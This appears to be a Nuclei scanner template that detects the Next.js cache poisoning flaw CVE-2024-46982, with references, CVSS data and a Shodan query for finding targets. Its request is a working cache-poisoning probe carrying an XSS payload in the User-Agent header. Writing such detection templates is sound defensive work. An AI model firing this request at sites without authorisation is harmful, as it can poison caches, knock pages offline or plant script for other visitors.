id: CVE-2024-46982
info:
  name: Next.js Cache Poisoning - DoS and XSS
  author: 0x88
  severity: high
  description: |
    Detects cache poisoning vulnerability in Next.js (13.5.1â€“14.2.9, Pages Router, non-dynamic SSR routes) via crafted HTTP requests, allowing DoS or stored XSS.
  reference:
    - https://github.com/vercel/next.js/security/advisories/GHSA-gp8f-8m3g-qvj9
    - https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H
    cvss-score: 7.5
    cve-id: CVE-2024-46982
    cwe-id: CWE-349
  metadata:
    verified: true
    shodan-query: http.component:"Next.js"
    tags: nextjs,cache-poisoning,dos,xss,cve,cve2024
http:
  - method: GET
    path:
      - "{{BaseURL}}/dashboard?__nextDataReq=1"
    headers:
      x-now-route-matches: "1"
      User-Agent: "<img src=x onerror=alert('test')>"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"pageProps":'
          - '<img src=x onerror=alert('test')>'
        part: body
        condition: or
      - type: word
        words:
          - 's-maxage=1, stale-while-revalidate'
        part: header
